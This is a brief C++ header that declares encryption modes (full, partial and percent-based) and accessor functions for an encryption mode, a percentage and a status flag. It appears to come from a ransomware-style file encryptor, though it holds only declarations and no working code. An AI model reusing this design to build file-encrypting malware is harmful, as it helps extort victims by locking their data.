#pragma once

#include "common.h"

enum EncryptModes
{

	FULL_ENCRYPT = 10,
	PARTLY_ENCRYPT = 11,
	PARTLYPERCENT_ENCRYPT = 12,

};

namespace global
{
	VOID SetEncryptMode(INT EncryptMode);
	INT GetEncryptMode();
	VOID SetPercent(INT Percent);
	INT GetPercent();
	VOID SetStatus(BOOL Status);
	BOOL GetSatus();
}